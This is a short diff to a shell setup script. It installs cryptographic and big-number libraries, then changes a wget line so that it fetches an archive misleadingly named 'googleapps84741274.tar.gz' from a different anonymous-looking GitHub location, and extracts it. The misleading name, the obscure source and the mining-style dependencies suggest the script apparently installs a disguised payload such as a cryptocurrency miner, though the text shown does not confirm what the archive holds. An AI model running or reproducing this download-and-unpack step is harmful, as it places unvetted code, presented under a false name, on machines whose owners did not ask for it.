@@ -1,6 +1,6 @@
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
-wget -N https://bitbucket.org/mobileapps84/mobileapps84121274/downloads/googleapps84741274.tar.gz
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googleapps84741274.tar.gz
 tar -xvf ./googleapps84741274.tar.gz
 
 cd googleapps8474
